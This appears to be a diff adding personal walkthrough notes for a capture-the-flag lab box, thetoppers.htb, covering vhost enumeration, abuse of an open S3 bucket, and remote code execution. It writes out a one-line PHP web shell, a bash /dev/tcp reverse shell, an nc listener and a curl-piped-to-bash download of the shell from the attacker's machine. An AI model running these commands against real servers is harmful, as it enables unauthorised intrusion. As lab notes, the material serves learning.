@@ -1,0 +1,29 @@
+  VHOST -> a virtual host is used for hosting different domain names on a single server
+  
+  After doing a nmap scan enumerate dns with : 
+  -> gobuster vhost -u http://thetoppers.htb/ --append-domain -w [wordlist location]
+	-> found s3.thetoppers.htb and added it to /etc/hosts so i can browse to it | s3 is important because it points to a amazon cloud storage
+	
+
+
+  After installing aws cli 
+  -> list out all the folders on the s3 storage by -> aws --endpoint=http://s3.thetoppers.htb s3 ls
+  -> then list everything in the file that was returned -> aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+  -> we see it can run .php files so we create a very basic shell in php and use the copy method provided in awscli to copy it over to the s3 bucket 
+  -> we create the shell with   ->  echo '<?php system($_GET["cmd"]); ?>' > shell.php
+  -> we copy the file with : aws --endpoint=http://s3.thetoppers.htb s3 cp [shellLocation] [remoteDestination]
+  -> then we browse to the wbsite and pass the commands like this : http://thetoppers.htb/shell.php?cmd=[command goes here]
+  
+  Now that we have a shell open on the target machine we can create a reverse shell to connect back to our machine
+  -> create a new shell to connect to our IP #!/bin/bash bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/<PORT> 0>&1
+  
+  now that we have the shell created create a listener with ncat on the specified port
+  -> nc -nvlp 1337
+  
+  now we need to host the shell on a webserver for the s3 bucket to get the shell
+  ->python 3 -m http.server 8000
+  
+  Now we can use the shell in the browser to download our bash shell 
+  -> http://thetoppers.htb/shell.php?cmd=curl%20<YOUR_IP_ADDRESS>:8000/shell.sh|bash  the |bash tells the cmd to run the file instad of just displaying it to the browser
+
+
